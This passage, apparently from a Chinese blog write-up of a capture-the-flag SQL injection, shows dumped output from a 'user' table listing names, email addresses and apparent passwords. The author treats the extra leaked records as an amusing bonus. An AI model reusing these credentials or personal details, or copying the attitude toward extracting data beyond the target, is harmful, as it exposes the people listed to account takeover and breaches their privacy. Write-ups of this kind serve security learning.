[09:41:40] [INFO] retrieved: 'National Institute of Science and Technology, Berhampur','priyanka@gmail.com','Priyanka Pattnaik','pinka'
select * from user [4]:
[*] 88888888, aaa@sina.com, aaa, 88888888
[*] kcc, janobe@gmail.com, janobe sourcecode, jan
[*] National Institute of Science and Technology, Berhampur, pinky@gmail.com, Swagatika Padhi, pinky
[*] National Institute of Science and Technology, Berhampur, priyanka@gmail.com, Priyanka Pattnaik, pinka</pre>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_094343.png" /></p>
<p>不但拿到了flag ， 还看到了其它的一些信息，有意思吧！</p>
<p>噔噔蹬蹬！！！</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_094440.png" /></p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_094614.png" /></p>

